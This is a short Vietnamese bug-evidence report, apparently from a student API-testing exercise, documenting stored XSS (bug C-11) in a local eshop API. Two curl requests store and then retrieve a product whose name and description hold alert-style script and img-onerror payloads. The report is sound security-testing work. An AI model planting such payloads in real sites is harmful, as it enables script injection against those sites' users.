# Bằng chứng tái hiện bug C-11

**name và description không được sanitize: payload script được lưu nguyên văn**

Thứ tự 2 bước dưới đây được chạy tự động bằng
`agent-skill/eshop-api-23127060/scripts/capture_bug_evidence.py` tren
`http://localhost:3000` luc 2026-09-02 23:57:45 +0700.
Bước CUỐI CÙNG là bước phơi bày bug; các bước trước chỉ dùng để chuẩn bị trạng thái.

## Bước 1/2 (chuẩn bị)

```bash
curl -i -X POST 'http://localhost:3000/api/products' \
     -H 'Content-Type: application/json' \
     -H 'X-Student-Id: 23127060' \
     -d '{"name": "<script>alert('23127060')</script>", "price": 1000, "description": "<img src=x onerror=alert(1)>", "imageUrl": "", "category_id": 1}'
```

```http
HTTP/1.1 200
Content-Type: application/json; charset=utf-8

{"message":"Product created","id":7}
```

## **BƯỚC 2/2 — PHƠI BÀY BUG**

```bash
curl -i -X GET 'http://localhost:3000/api/products/7' \
     -H 'Content-Type: application/json' \
     -H 'X-Student-Id: 23127060'
```

```http
HTTP/1.1 200
Content-Type: application/json; charset=utf-8

{"id":7,"name":"<script>alert('23127060')</script>","price":1000,"description":"<img src=x onerror=alert(1)>","imageUrl":"","category_id":1}
```

